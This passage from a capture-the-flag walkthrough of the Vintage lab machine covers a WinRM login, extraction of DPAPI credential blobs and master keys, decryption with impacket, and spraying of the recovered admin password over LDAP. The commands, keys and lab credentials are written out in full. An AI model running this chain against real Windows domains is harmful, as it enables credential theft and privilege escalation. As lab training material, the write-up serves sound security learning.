&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">    &lt;span class="nv">dns_lookup_kdc&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">true&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">    &lt;span class="nv">dns_lookup_realm&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">false&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">    &lt;span class="nv">ticket_lifetime&lt;/span> &lt;span class="o">=&lt;/span> 24h
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">    &lt;span class="nv">renew_lifetime&lt;/span> &lt;span class="o">=&lt;/span> 7d
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">    &lt;span class="nv">forwardable&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">true&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">    &lt;span class="nv">rdns&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">false&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">    &lt;span class="nv">default_ccache_name&lt;/span> &lt;span class="o">=&lt;/span> FILE:/tmp/krb5cc_%&lt;span class="o">{&lt;/span>uid&lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>realms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">    VINTAGE.HTB &lt;span class="o">=&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">        &lt;span class="nv">kdc&lt;/span> &lt;span class="o">=&lt;/span> dc01.vintage.htb
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">        &lt;span class="nv">admin_server&lt;/span> &lt;span class="o">=&lt;/span> dc01.vintage.htb
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">        &lt;span class="nv">default_domain&lt;/span> &lt;span class="o">=&lt;/span> vintage.htb
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">    &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>domain_realm&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">    .vintage.htb &lt;span class="o">=&lt;/span> VINTAGE.HTB
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">    vintage.htb &lt;span class="o">=&lt;/span> VINTAGE.HTB
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-32.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;h2 id="23-evil-winrm-as-cneri-">23. &lt;strong>EVIL-WINRM AS C.NERI&lt;/strong> :&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">evil-winrm -i dc01.vintage.htb -r vintage.htb
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-33.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-36.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;h2 id="24-post-enumeration-">24. &lt;strong>POST ENUMERATION&lt;/strong> :&lt;/h2>
&lt;p>Post enumeration reveals that the system was DPAPI based.&lt;/p>
&lt;h3 id="what-is-dpapi-">What is DPAPI ?&lt;/h3>
&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-39.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;h3 id="how-to-abuse-it-">How to abuse it ?&lt;/h3>
&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-40.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">dir -h
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-41.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">cd&lt;/span> AppData
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">dir -h
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>This didn’t show anything so we need to use the Get-ChildItem command&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">Get-ChildItem -Force
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-42.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">cd&lt;/span> Roaming
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Get-ChildItem -Force
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">cd&lt;/span> Microsoft
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Get-ChildItem -Force
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-43.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">cd&lt;/span> Credentials
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Get-ChildItem -Force
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-44.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;p>&lt;strong>We can’t download the file directory since it has DPAPI&lt;/strong>&lt;/p>
&lt;h2 id="25-privilege-escalation-">25. &lt;strong>PRIVILEGE ESCALATION&lt;/strong> :&lt;/h2>
&lt;p>For such systems we can read the credentials on that very same target as:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$fileContent&lt;/span>&lt;span class="o">=&lt;/span>Get-Content -Path .&lt;span class="se">\C&lt;/span>4BB96844A5C9DD45D5B6A9859252BA6 -Encoding Byte
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>Convert&lt;span class="o">]&lt;/span>::ToBase64String&lt;span class="o">(&lt;/span>&lt;span class="nv">$fileContent&lt;/span>&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>AQAAAKIBAAAAAAAAAQAAANCMnd8BFdERjHoAwE/Cl+sBAAAAo0HPmVKl90yo16yi1vczmwAAACA6AAAARQBuAHQAZQByAHAAcgBpAHMAZQAgAEMAcgBlAGQAZQBuAHQAaQBhAGwAIABEAGEAdABhAA0ACgAAAANmAADAAAAAEAAAANlsnh9uZhRwM1xc/8CNBwwAAAAABIAAAKAAAAAQAAAAK+zRTF7v+bPA1UScG2CL4uAAAABoyaUl8s/1J1TabkeZkP1VvjzlbcQ61ojdLQpks7Q0/irEKMmlFOJ/Za2o8akFz3kS28HEeNGkg/3kGNOvhVbnZ2NJQHTJ12SgjFuAuPhdS9Ob2CvqW9xu7pDGXPt5AHKqlqRy+fajjcEYkGP0ki6sLBF/rpFnQvRQ9hCg8iVqyq3BpSdwOZ1h0Zxh8mbvDPv+XHw9+o6DabZifdfj+GuMRi+GDNLvv8orYUqHZ6hHO3vB4kDu5T4G8QsIAtULBs3V2ww1G7xdGI57BGKi4LEk6kuaEWopsCflsc5FK4a4xBQAAABSjIrXKMIH3qbzDSrnPMUzCyhkAA==&lt;/code>&lt;/p>
&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-45.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;AQAAAKIBAAAAAAAAAQAAANCMnd8BFdERjHoAwE/Cl+sBAAAAo0HPmVKl90yo16yi1vczmwAAACA6AAAARQBuAHQAZQByAHAAcgBpAHMAZQAgAEMAcgBlAGQAZQBuAHQAaQBhAGwAIABEAGEAdABhAA0ACgAAAANmAADAAAAAEAAAANlsnh9uZhRwM1xc/8CNBwwAAAAABIAAAKAAAAAQAAAAK+zRTF7v+bPA1UScG2CL4uAAAABoyaUl8s/1J1TabkeZkP1VvjzlbcQ61ojdLQpks7Q0/irEKMmlFOJ/Za2o8akFz3kS28HEeNGkg/3kGNOvhVbnZ2NJQHTJ12SgjFuAuPhdS9Ob2CvqW9xu7pDGXPt5AHKqlqRy+fajjcEYkGP0ki6sLBF/rpFnQvRQ9hCg8iVqyq3BpSdwOZ1h0Zxh8mbvDPv+XHw9+o6DabZifdfj+GuMRi+GDNLvv8orYUqHZ6hHO3vB4kDu5T4G8QsIAtULBs3V2ww1G7xdGI57BGKi4LEk6kuaEWopsCflsc5FK4a4xBQAAABSjIrXKMIH3qbzDSrnPMUzCyhkAA==&amp;#34;&lt;/span> &lt;span class="p">|&lt;/span> base64 -d &amp;gt; secret
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">cat secret
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-46.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;p>Now get the 2nd part of it:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">cd&lt;/span> AppData&lt;span class="se">\R&lt;/span>oaming&lt;span class="se">\M&lt;/span>icrosoft&lt;span class="se">\p&lt;/span>rotect
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Get-ChildItem -Force
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-47.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">cd&lt;/span> S-1-5-21-4024337825-2033394866-2055507597-1115
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-48.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$fileContent2&lt;/span>&lt;span class="o">=&lt;/span>Get-Content -Path .&lt;span class="se">\4&lt;/span>dbf04d8-529b-4b4c-b4ae-8e875e4fe847 -Encoding Byte
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>Convert&lt;span class="o">]&lt;/span>::ToBase64String&lt;span class="o">(&lt;/span>&lt;span class="nv">$fileContent2&lt;/span>&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>AgAAAAAAAAAAAAAANABkAGIAZgAwADQAZAA4AC0ANQAyADkAYgAtADQAYgA0AGMALQBiADQAYQBlAC0AOABlADgANwA1AGUANABmAGUAOAA0ADcAAAAAAAAAAAAAAAAAiAAAAAAAAABoAAAAAAAAAAAAAAAAAAAAdAEAAAAAAAACAAAA2or8mZsV0QcGzC0XUJ9K8FBGAAAJgAAAA2YAAJhSpSk/CQYorLpjFuO6lxoHg+a9CGghh0pqkMYfO5Irop3dQGYbS2b3KJo0qLO586XfAvV/0dK/fM8a4erXENVlgtsrHRG48O/VO0Egw0qMZld65hY3jxMWTkzfGqfjNK5ytEtwPHGkAgAAAFiAHjGrO47Qhcn7oxZZBrBQRgAACYAAAANmAABRlZY9IPg0gA9TOU3DaFwm1ylSDyf2HHVE2mTqFzwbK7ZHp2XH8Mx2rvk6EpPUtdIv4kkQU6GsO43Xyg+qcks13CkP8uIIo0ECAAAAAAEAAFgAAACn2p9w/uXURbRTVVUG8NTwGUQAxdTpQrS3sEc8gVH9tmXllgaPOCz8cyowsRu8fkbCLFyIcsLVGKHQRv3PUJ1qmSeC604xcQlXI43XddWfFZ3tFF1yLQOSNwfbKDdGQiF3yTlYb6KoMvhQXzs1O1LLP2cUEFOGw8+Pg8uMN4KDBURRWfqmRksyn38bg3OKFSQ1K0CpdNzKfPvS6TnGuvHvnglzZdT5qwQ+nOdXFuJccenatjtlVgQNdp6yZOmpQjrkTtZOxz9b0JRsoOQS0NWu7WThQU4s8yeZkHaJRSJ5lohgdYpZiLJ4x1lG5jLz7/IX5pP6UK1cq5KwLjvaMdGsK9GDj3ofoB/OldTS7StCAXHfzvgjmTscAdxSARKV8ekuDWjsXgz7iZkV04lUG5Jo2FD9xrFdY1DqTSbr7oLdHAwzFBQX5RGnDhKFJXA0KJ29sz1zHGVn4/J4k0e/Hkop6YwRfEighbU=&lt;/code>&lt;/p>
&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-49.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$fileContent3&lt;/span>&lt;span class="o">=&lt;/span>Get-Content -Path .&lt;span class="se">\9&lt;/span>9cf41a3-a552-4cf7-a8d7-aca2d6f7339b -Encoding Byte
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>Convert&lt;span class="o">]&lt;/span>::ToBase64String&lt;span class="o">(&lt;/span>&lt;span class="nv">$fileContent3&lt;/span>&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>AgAAAAAAAAAAAAAAOQA5AGMAZgA0ADEAYQAzAC0AYQA1ADUAMgAtADQAYwBmADcALQBhADgAZAA3AC0AYQBjAGEAMgBkADYAZgA3ADMAMwA5AGIAAAAAAAAAAAAAAAAAiAAAAAAAAABoAAAAAAAAAAAAAAAAAAAAdAEAAAAAAAACAAAA6o788ZIMNhaSpbkSX0mC01BGAAAJgAAAA2YAABAM9ZX6Z/40RYL/aC+dw/D5oa7WMYBN56zwgXYX4QrAIb4DtJoM27zWgMxygJ36SpSHHHQGJMgTs6nZN5U/1q7DBIpQlsWk15jpmUFS2czCScuP9C+dGdYT+p6AWb3L7PZUPqNDHqZRAgAAALFxHXdcOeYbfN6CsYeVaYZQRgAACYAAAANmAABiEtEJeAVpg4QA0lnUzAsf6koPtccl1os9yZrj1gTAc/oSmhBNPEE3/VVVPZw9g3NP26Wj3vO36IOmtsXWYABkukmijrSaAZUCAAAAAAEAAFgAAACn2p9w/uXURbRTVVUG8NTwr2BFf0a0DhdM8JymBww6mzQt8tVsTbDmCZ/uZu3bzOAOUXODaGaJOOKqRm2W8rHPOZ27YjtD1pd0MFJDocNJwdhN5pwTdz2v2JsrVVVE363zZjXHeXefhuL5AMwMQr6gpTsCGcxrd1ziTN9Q1lH9QtnYE7OZlbrZPhiWO2vvdX+UQcKlgpxcSGLaczL53/UJXrvt9hueRn+YXxnK+fiyZ0gmjMlP+yuxOiKSvHM/UT6NmuYewnApQrOBO3A5F1XKHguHKT+VS187uBu/TO1ZT4/CrsKws1aG7EkIXhRKzEgukAwn5nZlU6YaADdeQRDzCR1D0ycJKFyZd4QE1Nt6Kbgr+ukbiurwBJd/D1a3+WWCw+S2OJVHB9qqlcW11heJd+v9eGe1Wf6/PYCvyyWMsvusF8XUswgKQbkH821vscyNmJWDwMply/ZvellKuGQ1/s5gVqUkALQ=&lt;/code>&lt;/p>
&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-50.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;AgAAAAAAAAAAAAAAOQA5AGMAZgA0ADEAYQAzAC0AYQA1ADUAMgAtADQAYwBmADcALQBhADgAZAA3AC0AYQBjAGEAMgBkADYAZgA3ADMAMwA5AGIAAAAAAAAAAAAAAAAAiAAAAAAAAABoAAAAAAAAAAAAAAAAAAAAdAEAAAAAAAACAAAA6o788ZIMNhaSpbkSX0mC01BGAAAJgAAAA2YAABAM9ZX6Z/40RYL/aC+dw/D5oa7WMYBN56zwgXYX4QrAIb4DtJoM27zWgMxygJ36SpSHHHQGJMgTs6nZN5U/1q7DBIpQlsWk15jpmUFS2czCScuP9C+dGdYT+p6AWb3L7PZUPqNDHqZRAgAAALFxHXdcOeYbfN6CsYeVaYZQRgAACYAAAANmAABiEtEJeAVpg4QA0lnUzAsf6koPtccl1os9yZrj1gTAc/oSmhBNPEE3/VVVPZw9g3NP26Wj3vO36IOmtsXWYABkukmijrSaAZUCAAAAAAEAAFgAAACn2p9w/uXURbRTVVUG8NTwr2BFf0a0DhdM8JymBww6mzQt8tVsTbDmCZ/uZu3bzOAOUXODaGaJOOKqRm2W8rHPOZ27YjtD1pd0MFJDocNJwdhN5pwTdz2v2JsrVVVE363zZjXHeXefhuL5AMwMQr6gpTsCGcxrd1ziTN9Q1lH9QtnYE7OZlbrZPhiWO2vvdX+UQcKlgpxcSGLaczL53/UJXrvt9hueRn+YXxnK+fiyZ0gmjMlP+yuxOiKSvHM/UT6NmuYewnApQrOBO3A5F1XKHguHKT+VS187uBu/TO1ZT4/CrsKws1aG7EkIXhRKzEgukAwn5nZlU6YaADdeQRDzCR1D0ycJKFyZd4QE1Nt6Kbgr+ukbiurwBJd/D1a3+WWCw+S2OJVHB9qqlcW11heJd+v9eGe1Wf6/PYCvyyWMsvusF8XUswgKQbkH821vscyNmJWDwMply/ZvellKuGQ1/s5gVqUkALQ=&amp;#34;&lt;/span> &lt;span class="p">|&lt;/span> base64 -d &amp;gt; b1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-51.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">cat b1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-52.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;AgAAAAAAAAAAAAAANABkAGIAZgAwADQAZAA4AC0ANQAyADkAYgAtADQAYgA0AGMALQBiADQAYQBlAC0AOABlADgANwA1AGUANABmAGUAOAA0ADcAAAAAAAAAAAAAAAAAiAAAAAAAAABoAAAAAAAAAAAAAAAAAAAAdAEAAAAAAAACAAAA2or8mZsV0QcGzC0XUJ9K8FBGAAAJgAAAA2YAAJhSpSk/CQYorLpjFuO6lxoHg+a9CGghh0pqkMYfO5Irop3dQGYbS2b3KJo0qLO586XfAvV/0dK/fM8a4erXENVlgtsrHRG48O/VO0Egw0qMZld65hY3jxMWTkzfGqfjNK5ytEtwPHGkAgAAAFiAHjGrO47Qhcn7oxZZBrBQRgAACYAAAANmAABRlZY9IPg0gA9TOU3DaFwm1ylSDyf2HHVE2mTqFzwbK7ZHp2XH8Mx2rvk6EpPUtdIv4kkQU6GsO43Xyg+qcks13CkP8uIIo0ECAAAAAAEAAFgAAACn2p9w/uXURbRTVVUG8NTwGUQAxdTpQrS3sEc8gVH9tmXllgaPOCz8cyowsRu8fkbCLFyIcsLVGKHQRv3PUJ1qmSeC604xcQlXI43XddWfFZ3tFF1yLQOSNwfbKDdGQiF3yTlYb6KoMvhQXzs1O1LLP2cUEFOGw8+Pg8uMN4KDBURRWfqmRksyn38bg3OKFSQ1K0CpdNzKfPvS6TnGuvHvnglzZdT5qwQ+nOdXFuJccenatjtlVgQNdp6yZOmpQjrkTtZOxz9b0JRsoOQS0NWu7WThQU4s8yeZkHaJRSJ5lohgdYpZiLJ4x1lG5jLz7/IX5pP6UK1cq5KwLjvaMdGsK9GDj3ofoB/OldTS7StCAXHfzvgjmTscAdxSARKV8ekuDWjsXgz7iZkV04lUG5Jo2FD9xrFdY1DqTSbr7oLdHAwzFBQX5RGnDhKFJXA0KJ29sz1zHGVn4/J4k0e/Hkop6YwRfEighbU=&amp;#34;&lt;/span> &lt;span class="p">|&lt;/span> base64 -d &amp;gt; b2
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-53.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">cat b2
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-54.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;h2 id="26-decrypting-the-found-credentials-of-dpapi-">26. &lt;strong>DECRYPTING THE FOUND CREDENTIALS OF DPAPI&lt;/strong> :&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">impacket-dpapi masterkey -file b1 -sid S-1-5-21-4024337825-2033394866-2055507597-1115 -password Zer0the0ne
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-55.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;p>&lt;code>Decrypted key:&lt;/code>
&lt;code>0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">impacket-dpapi masterkey -file b2 -sid S-1-5-21-4024337825-2033394866-2055507597-1115 -password Zer0the0ne
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-56.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;p>&lt;code>Decrypted key:&lt;/code>
&lt;code>0x55d51b40d9aa74e8cdc44a6d24a25c96451449229739a1c9dd2bb50048b60a652b5330ff2635a511210209b28f81c3efe16b5aee3d84b5a1be3477a62e25989f&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">impacket-dpapi credential -file secret -key 0x55d51b40d9aa74e8cdc44a6d24a25c96451449229739a1c9dd2bb50048b60a652b5330ff2635a511210209b28f81c3efe16b5aee3d84b5a1be3477a62e25989f
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-57.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">impacket-dpapi credential -file secret -key 0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-58.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;p>&lt;code>Username:&lt;/code> &lt;strong>vintage\c.neri_adm&lt;/strong>
&lt;code>Password:&lt;/code> &lt;strong>Uncr4ck4bl3P4ssW0rd0312&lt;/strong>&lt;/p>
&lt;p>So we got a &lt;strong>neri_adm&lt;/strong> user. Lets check this user via bloodhound. And also its ldap information&lt;/p>
&lt;h2 id="27-cneri_adm-ldap-information-">27. &lt;strong>C.NERI_ADM LDAP INFORMATION&lt;/strong> :&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo netexec ldap 10.10.11.45 -u usernames.txt -p Uncr4ck4bl3P4ssW0rd0312 -k --continue-on-success
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-59.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
